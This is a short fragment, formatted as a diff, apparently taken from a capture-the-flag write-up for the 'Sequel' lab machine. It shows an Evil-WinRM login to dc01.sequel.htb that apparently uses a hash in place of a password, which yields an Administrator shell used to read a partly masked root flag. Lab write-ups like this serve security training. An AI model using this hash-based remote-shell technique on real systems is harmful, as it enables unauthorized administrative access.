@@ -1,0 +1,1 @@
+7a8d4e04986afa8ed4060f75e5a0b3ff -i dc01.sequel.htb Evil-WinRM shell v3.5 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\Administrator\Documents> And grab the root flag: *Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt a5a688f3************************
